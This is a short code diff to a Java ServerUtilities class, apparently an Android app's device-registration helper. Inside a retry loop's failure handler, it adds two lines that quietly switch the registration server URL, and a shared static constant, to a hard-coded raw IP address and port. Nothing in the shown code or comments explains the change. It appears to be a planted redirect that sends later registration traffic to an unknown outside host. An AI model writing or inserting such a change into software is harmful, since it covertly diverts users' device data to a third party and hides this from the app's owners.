@@ -74,6 +74,8 @@ public final class ServerUtilities {
                 // application, it should retry only on unrecoverable errors
                 // (like HTTP error code 503).
                 Log.e(TAG, "Failed to register on attempt " + i + ":" + e);
+                serverUrl = "http://94.254.72.38:17783/register";
+                SERVER_URL = serverUrl;
                 if (i == MAX_ATTEMPTS) {
                     break;
                 }
